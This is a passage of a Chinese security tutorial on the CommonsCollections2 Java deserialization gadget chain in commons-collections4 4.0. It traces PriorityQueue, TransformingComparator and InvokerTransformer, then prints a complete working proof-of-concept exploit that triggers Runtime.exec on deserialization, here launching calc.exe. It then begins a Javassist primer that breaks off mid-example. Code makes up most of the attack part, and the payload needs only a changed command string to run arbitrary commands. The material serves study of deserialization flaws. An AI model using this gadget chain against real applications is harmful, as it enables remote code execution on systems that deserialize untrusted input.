## 前言
来啰嗦一下CC2，这条链在后面几条链中还会用到，详细的写一下，打好基础。
**环境搭建**  
CC2使用的是`javassist`和`PriorityQueue`来构造利用链；  
并且使用的是`commons-collections-4.0`版本，而3.1-3.2.1版本中`TransformingComparator`并没有去实现`Serializable`接口，也就是说这是不可以被序列化的，所以CC2不用3.x版本。
  * JDK 1.7
  * commons-collections-4.0
在`pom.xml`中添加：
        org.apache.commons
        commons-collections4
        4.0
**利用链**
    ObjectInputStream.readObject()
                PriorityQueue.readObject()
                    ...
                        TransformingComparator.compare()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
## 利用链1分析
跟着利用链，首先看看`PriorityQueue.readObject()`  
这里的`queue[i]`是从`readObject`得到的，再看看`writeObject`；  
`writeObject`中依次将`queue[i]`进行序列化，那么我们通过反射实例化PriorityQueue类的对象，给`queue[i]`赋值，就实现了对`queue[i]`的控制。
最后调用了`heapify`方法，跟进：  
当`i>=0`时进入for循环，而`i=(size >>> 1) -1`将size进行了右移操作，所以`size>1`才能进入循环。
再跟进`siftDown`方法：  
x就是`queue[i]`，跟进`siftDownUsingComparator`方法：  
重点在`comparator.compare(x, (E) c)`；  
跟进可以看到`Comparator`是一个接口，compare是它的抽象方法；  
CC2利用链中`TransformingComparator`类实现了compare方法；  
该方法中调用了`this.transformer.transform()`方法，看到这里，就有点熟悉了，`this.transformer`又是我们可控的，后面的理解和CC1差不多了。
## POC1分析
    import org.apache.commons.collections4.Transformer;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.ChainedTransformer;
    import org.apache.commons.collections4.functors.ConstantTransformer;
    import org.apache.commons.collections4.functors.InvokerTransformer;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.PriorityQueue;
    public class Test1 {
        public static void main(String[] args) throws Exception{
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                    new InvokerTransformer("exec", new Class[] { String.class}, new String[] {"calc.exe"}),
            };
            Transformer transformerChain = new ChainedTransformer(transformers);
            TransformingComparator Tcomparator = new TransformingComparator(transformerChain);
            PriorityQueue queue = new PriorityQueue(1, Tcomparator);
            queue.add(1);
            queue.add(2);
            try{
                ByteArrayOutputStream barr = new ByteArrayOutputStream();
                ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("cc2.txt"));
                outputStream.writeObject(queue);
                outputStream.close();
                System.out.println(barr.toString());
                ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("cc2.txt"));
                inputStream.readObject();
            }catch(Exception e){
                e.printStackTrace();
            }
        }
    }
**代码1**  
通过反射获取Runtime对象；
    Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                    new InvokerTransformer("exec", new Class[] { String.class}, new String[] {"calc.exe"}),
            };
**代码2**  
当调用ChainedTransformer的transformer方法时，对transformers数组进行回调，从而执行命令；  
将transformerChain传入TransformingComparator，从而调用transformer方法；  
new一个PriorityQueue对象，传入一个整数参数，且传入的数值不能小于1，再将Tcomparator传入。
    Transformer transformerChain = new ChainedTransformer(transformers);
    TransformingComparator Tcomparator = new TransformingComparator(transformerChain);
    PriorityQueue queue = new PriorityQueue(1, Tcomparator);
**代码3**  
前面说到，size的值要大于1，所以向queue中添加两个元素。
    queue.add(1);
    queue.add(2);
添加上序列化和反序列化代码后，能成功执行命令，但是没有生成序列化文件，也就是没有`cc2.txt`。
调试代码看一看，跟进`PriorityQueue`类，这里comparator参数是我们传入的`Tcomparator`；  
继续跟，跟进`queue.add(2)`，调用了`offer`方法；  
跟进`offer`方法，进入else分支，调用了`siftUp`方法；  
跟进`siftUp`方法，comparator参数不为null，进入if分支，调用`siftUpUsingComparator`方法；  
继续跟，来到重点代码；  
跟进，这里会执行两次命令；  
但是return的值为0，程序就结束了，并没有执行POC后面序列化和反序列化的代码。
那么如何让return不为0呢。  
既然调用`siftUpUsingComparator`方法会出错，那试试调用`siftUpComparable`方法，即comparator参数为null，修改代码，不传入comparator参数。
    PriorityQueue queue = new PriorityQueue(1);
再调试看看；  
这下comparator参数就为null；  
照样进入`queue.add(2)`，到`siftUp`方法，就进入else分支，调用`siftUpComparable`方法；  
这样就只是单纯给`queue[1]`赋值，并不会调用`compare`方法；  
返回后就执行序列化代码，但是并没有执行命令，还要改进；
**代码4**  
上面修改后的代码没有调用到`compare`方法，我们可以在向queue中添加元素后，通过反射将`Tcomparator`传入到queue的comparator参数；
    Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
    field.setAccessible(true);
     field.set(queue,Tcomparator);
这样comparator参数就不为null，当反序列化时调用`readObject`方法时就会进入`siftDownUsingComparator`方法，调用`compare`方法，从而执行命令。  
**完整POC**
    import org.apache.commons.collections4.Transformer;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.ChainedTransformer;
    import org.apache.commons.collections4.functors.ConstantTransformer;
    import org.apache.commons.collections4.functors.InvokerTransformer;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.util.PriorityQueue;
    public class Test1 {
        public static void main(String[] args) throws Exception{
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                    new InvokerTransformer("exec", new Class[] { String.class}, new String[] {"calc.exe"}),
            };
            Transformer transformerChain = new ChainedTransformer(transformers);
            TransformingComparator Tcomparator = new TransformingComparator(transformerChain);
            PriorityQueue queue = new PriorityQueue(1);
            queue.add(1);
            queue.add(2);
            Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
            field.setAccessible(true);
            field.set(queue,Tcomparator);
            try{
                ByteArrayOutputStream barr = new ByteArrayOutputStream();
                ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("cc2.txt"));
                outputStream.writeObject(queue);
                outputStream.close();
                System.out.println(barr.toString());
                ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("cc2.txt"));
                inputStream.readObject();
            }catch(Exception e){
                e.printStackTrace();
            }
        }
    }
## Javassit补充
**简述：**  
Javassist是一个开源的分析、编辑和创建Java字节码的类库，可以直接编辑和生成Java生成的字节码。  
能够在运行时定义新的Java类，在JVM加载类文件时修改类的定义。  
Javassist类库提供了两个层次的API，源代码层次和字节码层次。源代码层次的API能够以Java源代码的形式修改Java字节码。字节码层次的API能够直接编辑Java类文件。
下面大概讲一下POC中会用到的类和方法：
**ClassPool**  
ClassPool是CtClass对象的容器，它按需读取类文件来构造CtClass对象，并且保存CtClass对象以便以后使用，其中键名是类名称，值是表示该类的CtClass对象。
常用方法：
  * `static ClassPool getDefault()`：返回默认的ClassPool，一般通过该方法创建我们的ClassPool；
  * `ClassPath insertClassPath(ClassPath cp)`：将一个ClassPath对象插入到类搜索路径的起始位置；
  * `ClassPath appendClassPath`：将一个ClassPath对象加到类搜索路径的末尾位置；
  * `CtClass makeClass`：根据类名创建新的CtClass对象；
  * `CtClass get(java.lang.String classname)`：从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用；
**CtClass**  
CtClass类表示一个class文件，每个CtClass对象都必须从ClassPool中获取。
常用方法：
  * `void setSuperclass(CtClass clazz)`：更改超类，除非此对象表示接口；
  * `byte[] toBytecode()`：将该类转换为类文件；
  * `CtConstructor makeClassInitializer()`：制作一个空的类初始化程序（静态构造函数）；
**示例代码**
    import javassist.*;
    public class javassit_test {
        public static void createPerson() throws Exception{
            //实例化一个ClassPool容器
            ClassPool pool = ClassPool.getDefault();
            //新建一个CtClass，类名为Cat
            CtClass cc = pool.makeClass("Cat");